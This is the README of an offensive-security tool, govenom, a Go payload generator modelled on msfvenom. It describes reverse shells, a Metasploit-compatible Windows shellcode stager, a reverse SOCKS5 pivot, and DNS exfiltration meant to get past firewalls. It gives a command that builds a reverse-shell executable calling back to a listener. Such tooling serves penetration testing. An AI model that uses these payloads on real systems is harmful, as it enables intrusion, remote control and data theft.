<p align="center">
  <img alt="govenom Logo" src="https://repository-images.githubusercontent.com/208469800/1d777d80-e3d9-11ea-8f39-739f2e6af4d9" height="140" />
  <h1 align="center"><b>govenom</b></h1>
  <p align="center"><i>No clue about the target environment, installed shells, firewall rules? Uncommon CPU architecture?</br>Govenom has you covered!</i></p>
  <p align="center">
    <a href="https://github.com/erikgeiser/govenom/releases/latest"><img alt="Release" src="https://img.shields.io/github/release/erikgeiser/govenom.svg?style=for-the-badge"></a>
    <a href="/LICENSE.md"><img alt="Software License" src="https://img.shields.io/badge/license-MIT-brightgreen.svg?style=for-the-badge"></a>
    <a href="https://github.com/erikgeiser/govenom/actions?workflow=Check"><img alt="GitHub Actions" src="https://img.shields.io/github/workflow/status/erikgeiser/govenom/Check?label=Check&style=for-the-badge"></a>
    <a href="https://github.com/erikgeiser/govenom/actions?workflow=Build"><img alt="GitHub Actions" src="https://img.shields.io/github/workflow/status/erikgeiser/govenom/Build?label=Build&style=for-the-badge"></a>
    <a href="https://goreportcard.com/report/github.com/erikgeiser/govenom"><img alt="Go Report Card" src="https://goreportcard.com/badge/github.com/erikgeiser/govenom?style=for-the-badge"></a>
  </p>
</p>

`govenom` is a `msfvenom`-inspired payload generator written in
Go. This makes it easy to cross-compile static binaries for a
variety of target platforms. It is also much faster than `msfvenom`.

## Payloads

Currently, four payloads are supported:

- **rsh:** A simple reverse shell. It selects one of the most common
  shells binaries and makes it available via TCP or UDPconnection.
- **xrsh:** An extended robust reverse shell. A simple heuristic
  determines the most suitable shell executable, taking shells that
  are installed but not in `$PATH` into account. In contrast to most
  other available shells out there, additional info can be sent via
  alternative communication channels via the exfiltration mechanism
  (see relevant section below). For example, if no shell could be
  detected or the connection could not be established due to a
  firewall, the corresponding error can be exfiltrated via DNS.
- **stager**: A shellcode stager that is compatible with Metasploits
  `exploits/multi/handler` with a `meterpreter/reverse_tcp` payload.
  It first reads a 4 Byte shellcode length and then the shellcode
  itself from a TCP connection and executes it. Currently, this is
  only available for Windows targets.

- **socks5**: A `socks5` server via a reverse TCP connection. It
  connects back to the `gateway` tool and provides network access
  to the target's network. The `socks5` server on the target
  system can only be accessed by connecting to the gateway listener
  opened by the govenom `gateway` tool.

## Tools

`govenom` also provides some tools to work with the payloads:

- **dnslogger:** The `dnslogger` tool decodes and recombines messages
  that were exfiltrated via DNS.

- **pusher:** The `pusher` tool can serve and deliver `meterpreter`
  shellcode generated using `msfvenom` to the `govenom` stager payload.

- **gateway:** the gateway for the `socks5` payload. It waits for
  the payload to connect back and starts a lister which forwards
  connection to the payload's `socks5` server and thus acts as a
  gateway into the target's network.

## Debug Exfiltration

Sometimes a shell you placed on target system does not appear to
connect back. Most of the time this results in a lot of trial and
error. Maybe the firewall blocks TCP connections or maybe just one
of the ports you tried. Maybe you expected `powershell` to be
present but only `cmd` is there. The solution to problem is the
`govenom` debug log exfiltration mechanism which can optionally be
used with `xrsh` and `stager` payloads. It lets you configure an
arbitrary amount of exfiltration strategies of the following types:

- **`stdout`/`stderr`:** If you can capture the output of your
  payload when it's executed, you can output debug logs via
  `stdout/stderr`.

- **DNS:** The most useful exfiltration type because noone blocks
  DNS. Messages are encoded and split into parts which can be put
  together again by the `govenom` tool `dnslogger` (see section
  below).

- **File:** Write the debug information into a file on the target
  system. This is for example useful if you can recover files via a
  local file inclusion vulnerability.

- **Net (`dial`):** Send the debug log via a TCP or UDP connection
  that's different from the original connect back connection.

## Building

`govenom` can be built in two ways. It either generate payloads
directly from the source code in the `./payloads` folder of this
repos or it can be built with the source code embedded such that
it works as a standalone binary. The binaries distributed with
releases are standalone binaries.

```bash
# build a govenom binary that uses the payload code
# directly from the repository
go build

# build a standalone govenom binary (see the standalone
# Makefile section for the commands to build on Windows)
make standalone
```

## Usage

Run `go run govenom.go` for detailed usage information. The following
example generates the extended reverse shell for a 32-Bit Windows
target that connects back to `127.0.0.1:1337` and uses multiple debug
exfiltration strategies:

```bash
# generate a payload
govenom payload xrsh -d 127.0.0.1:1337 \
    --os windows --arch 386 \
    --exfil dns:example.com,stdout,dial:udp:127.0.0.1:1234 \
    -o revsh.exe

# run a tool
govenom tool dnslogger
```

**Note:** Go has to be installed to run `govenom` itself and it is
also used by `govenom` itself to build the selected payloads.

## FAQ:

---

**The `govenom` integrity cannot be verified on macOS**

macOS adds a quarantine attribute to downloaded binaries
which you can remove with the following command:

```
xattr -d com.apple.quarantine ./govenom
```

---

## Plans

- Connection encryption
- Reverse shell listener like `ncat` with logging capabilities
- Linux support for the `stager` payload

Thanks to [https://quasilyte.dev]() for the logo.
